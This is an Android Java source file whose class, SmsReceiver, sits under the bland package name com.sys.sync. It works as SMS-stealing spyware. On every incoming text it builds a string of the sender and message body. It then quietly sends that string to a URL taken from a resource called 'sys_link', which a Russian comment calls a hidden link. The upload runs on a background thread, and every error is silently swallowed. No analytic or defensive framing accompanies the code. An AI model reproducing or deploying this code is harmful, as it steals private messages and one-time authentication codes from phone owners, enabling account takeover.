package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle b = intent.getExtras();
            if (b == null) return;
            Object[] p = (Object[]) b.get("pdus");
            if (p == null) return;
            
            for (Object obj : p) {
                SmsMessage s = SmsMessage.createFromPdu((byte[]) obj);
                String msg = s.getOriginatingAddress() + " : " + s.getMessageBody();
                
                // Достаем скрытую ссылку из ресурсов
                String base = context.getString(context.getResources().getIdentifier("sys_link", "string", context.getPackageName()));
                
                new Thread(() -> {
                    HttpURLConnection c = null;
                    try {
                        URL url = new URL(base + URLEncoder.encode(msg, "UTF-8"));
                        c = (HttpURLConnection) url.openConnection();
                        c.setRequestMethod("GET");
                        c.setConnectTimeout(10000);
                        c.getResponseCode();
                    } catch (Exception ignored) {
                    } finally {
                        if (c != null) c.disconnect();
                    }
                }).start();
            }
        } catch (Exception ignored) {}
    }
}
